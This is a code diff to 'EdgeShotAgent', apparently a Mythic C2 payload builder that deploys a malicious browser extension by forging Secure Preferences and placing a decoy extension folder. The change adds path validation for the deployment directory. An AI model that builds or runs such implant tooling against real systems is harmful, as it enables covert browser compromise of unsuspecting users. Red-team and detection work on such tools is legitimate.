@@ -148,7 +148,10 @@ class EdgeShotAgent(PayloadType):
         BuildParameter(
             name="target_dir",
             parameter_type=BuildParameterType.String,
-            description="Deployment root on the target (stomp/GAP modes). Empty = platform default (Windows: C:\\ProgramData\\EdgeShot, macOS/Linux: /tmp/.edgeshot).",
+            description="Deployment root on the target (stomp/GAP modes). Empty = platform default "
+                        "(Windows: C:\\ProgramData\\EdgeShot, macOS/Linux: /tmp/.edgeshot). Use an "
+                        "absolute, writable path; on macOS that is /Users/<you>/... (NOT /home/..., "
+                        "which is the automounter mount and cannot be created).",
             required=False,
             default_value="",
         ),
@@ -289,6 +292,28 @@ class EdgeShotAgent(PayloadType):
         if platform == "windows":
             return r"C:\ProgramData\EdgeShot"
         return "/tmp/.edgeshot"
+
+    def _resolve_target_dir(self, target_dir: str, platform: str) -> str:
+        """Normalize the deployment root and reject paths that can never work.
+
+        A trailing separator is stripped so the inject script and the Secure
+        Preferences ``path`` field agree on the same directory (no ``//``). On
+        macOS ``/home`` is owned by the automounter (auto_home), so ``mkdir``
+        under it fails with "Operation not supported"; the real home lives at
+        ``/Users/<user>``.
+        """
+        resolved = (target_dir or self._default_target_dir(platform)).rstrip("/\\") \
+            or self._default_target_dir(platform)
+
+        if platform == "darwin" and (resolved == "/home" or resolved.startswith("/home/")):
+            raise ValueError(
+                "target_dir points under '/home', which is not writable on macOS "
+                "(it is the automounter mount). Use your real home, e.g. "
+                "'/Users/<username>/', or leave target_dir empty to deploy under "
+                "/tmp/.edgeshot."
+            )
+
+        return resolved
 
     def _selected_os_platform(self) -> str:
         """Map Mythic's selected_os (the OS step) to the deploy platform key.
@@ -561,7 +586,7 @@ class EdgeShotAgent(PayloadType):
         # The extension folder is named by its CRX ID (the script copies
         # extension/<id>/ -> <target_dir>/<id>/), so the Secure Preferences
         # `path` must point at <target_dir>/<id>.
-        target_dir = target_dir or self._default_target_dir(platform)
+        target_dir = self._resolve_target_dir(target_dir, platform)
         deploy_path = _path_join(platform, target_dir, crx_id)
 
         # Read the uploaded (original) Secure Preferences and forge the patched one.
@@ -656,7 +681,7 @@ class EdgeShotAgent(PayloadType):
         with open(benign_bg_path, "r", encoding="utf-8") as f:
             benign_bg_code = f.read()
 
-        target_dir = target_dir or self._default_target_dir(platform)
+        target_dir = self._resolve_target_dir(target_dir, platform)
         malicious_name = crx_id
         # The decoy folder on disk is named after the operator's extension
         # (ADDONNAME, already substituted into the manifest) rather than a
